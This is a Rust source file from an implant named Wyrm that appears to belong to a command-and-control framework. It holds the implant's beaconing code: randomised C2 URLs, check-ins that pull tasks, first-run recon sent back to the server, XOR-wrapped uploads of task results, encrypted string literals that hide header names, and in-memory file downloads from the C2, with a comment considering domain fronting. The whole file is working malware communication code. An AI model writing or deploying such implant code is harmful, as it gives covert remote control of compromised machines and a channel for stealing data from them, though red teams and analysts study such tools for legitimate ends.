//! Implant communications are handled here.

use std::collections::HashMap;

use crate::{utils::time_utils::epoch_now, wyrm::Wyrm};
use minreq::Response;
use rand::Rng;
use shared::{
    net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
    tasks::{Command, Task},
};
use str_crypter::{decrypt_string, sc};

/// Constructs the C2 URL by randomly choosing the URI to visit.
fn construct_c2_url(implant: &Wyrm) -> String {
    let mut rng = rand::rng();
    let i = rng.random_range(0..implant.c2_config.api_endpoints.len());

    let uri = &implant.c2_config.api_endpoints[i];
    const COLON_SZ: usize = 1;
    const MAX_PORT_SZ: usize = 6;
    const LEEWAY_SLASH_SZ: usize = 1;
    let approx_len =
        implant.c2_config.url.len() + COLON_SZ + MAX_PORT_SZ + uri.len() + LEEWAY_SLASH_SZ;

    let mut s = String::with_capacity(approx_len);

    s.push_str(&implant.c2_config.url);
    s.push(':');
    s.push_str(&implant.c2_config.port.to_string());

    // Ensure we start with a '/' in case the operator is laxy dazy :)
    if !uri.starts_with('/') {
        s.push('/');
    };

    s.push_str(&uri);

    s
}

/// Checks in with the C2 and gets any pending tasks.
pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Error> {
    let formatted_url = construct_c2_url(implant);
    let sec_token = &implant.c2_config.security_token;
    let ua = &implant.c2_config.useragent;
    let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);

    // Make the actual request, depending upon whether we have data to upload or not
    let response = if implant.completed_tasks.is_empty() {
        http_get(formatted_url.clone(), headers)?
    } else {
        http_post(formatted_url.clone(), implant, headers)?
    };

    let mut tasks: Vec<Task> = vec![];

    if response.status_code != 200 {
        #[cfg(debug_assertions)]
        println!(
            "[-] Status code was not OK 200. Got: {}. URL: {}",
            response.status_code, formatted_url
        );

        tasks.push(Task {
            id: 0,
            command: Command::Sleep,
            metadata: None,
            completed_time: epoch_now(),
        });

        return Ok(tasks);
    }

    Ok(decode_tasks_stream(response.as_bytes()))
}

fn http_get(url: String, headers: HashMap<String, String>) -> Result<Response, minreq::Error> {
    minreq::get(url).with_headers(headers).send()
}

fn http_post(
    url: String,
    implant: &mut Wyrm,
    headers: HashMap<String, String>,
) -> Result<Response, minreq::Error> {
    let mut completed_tasks: TasksNetworkStream = Vec::new();

    //
    // For each task that has been completed, we need to encode it properly so that it fits
    // with the standard of:    XOR ENVELOPE([u32 Command][u16 string result]).
    //
    // We can then push this to the completed tasks, which will be serialised itself, and then
    // sending on its merry way to the C2.
    //
    while let Some(task) = implant.completed_tasks.pop() {
        let encoded_byte_response = encode_u16buf_to_u8buf(&task).xor_network_stream();
        completed_tasks.push(encoded_byte_response);
    }

    let serialised_post_body: Vec<u8> =
        serde_json::to_vec(&completed_tasks).expect("could not ser");

    minreq::post(&url)
        // .with_header("Host", host) -> TODO domain fronting?
        .with_header("Content-Type", "application/json")
        .with_headers(headers)
        .with_body(serialised_post_body)
        .send()
}

/// Generates some generic headers which we send along with the HTTP request to the C2.
/// These are to be the same for GET, POST, etc. Includes:
///
/// - Implant ID
fn generate_generic_headers(
    implant_id: &str,
    security_token: &str,
    ua: &str,
) -> HashMap<String, String> {
    let mut headers = HashMap::new();

    let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
    let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
    let _ = headers.insert(sc!("authorization", 92).unwrap(), security_token.to_owned());

    headers
}

/// Decode a `Response` byte stream from the C2 into a Vec of individual `Task`'s,
///
/// The data coming into this function will be XOR encrypted, as per a hardcoded XOR key
/// shared between both the C2 and the implant. This routine will first decode each
/// inbound packet, and then decode the HTTP response as per the implant's communication
/// scheme.
///
/// # Returns
/// A vector of [`Task`] ready to be dispatched or otherwise available to work with.
pub fn decode_tasks_stream(byte_response: &[u8]) -> Vec<Task> {
    // Parse JSON into the inner binary packets
    let packets: Vec<Vec<u8>> = match serde_json::from_slice(byte_response) {
        Ok(p) => p,
        Err(_) => return vec![],
    };

    // For each packet, undo the XOR and decode header+body
    packets
        .into_iter()
        .map(|pkt| {
            let decrypted = pkt.xor_network_stream();
            decode_http_response(&decrypted)
        })
        .collect()
}

/// Makes a request to the C2 when it's the first time checking in per session, e.g. after reboot or after the agent
/// has for some reason, exit.
///
/// Function pulls configuration settings down, and sends local config up where required for that first check-in.
pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Error> {
    implant.conduct_first_run_recon();

    //
    // make the request
    //

    let formatted_url = construct_c2_url(implant);
    let sec_token = &implant.c2_config.security_token;
    let ua = &implant.c2_config.useragent;
    let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);
    let response = http_post(formatted_url.clone(), implant, headers)?;

    //
    // We get back some settings from the C2
    //
    let mut tasks: Vec<Task> = vec![];

    if response.status_code != 200 {
        #[cfg(debug_assertions)]
        println!(
            "[-] Status code was not OK 200. Got: {}. Sent to: {}",
            response.status_code, formatted_url,
        );

        tasks.push(Task {
            id: 0,
            command: Command::AgentsFirstSessionBeacon,
            metadata: None,
            completed_time: epoch_now(),
        });

        return Ok(tasks);
    }

    Ok(decode_tasks_stream(response.as_bytes()))
}

/// Downloads a file to a buffer in memory
///
/// # Note
/// As this function downloads a file **in memory**, ensure you are not downloading something massive with this
/// as it will cause the device to run OOM. If that functionality is necessary, then make a streaming function which
/// downloads to a file over a stream.
pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8>, minreq::Error> {
    let formatted_url = format!("{}:{}{}", wyrm.c2_config.url, wyrm.c2_config.port, uri);
    let sec_token = &wyrm.c2_config.security_token;
    let ua = &wyrm.c2_config.useragent;
    let headers = generate_generic_headers(&wyrm.implant_id, sec_token, ua);

    let response = http_get(formatted_url, headers)?;

    Ok(response.into_bytes())
}
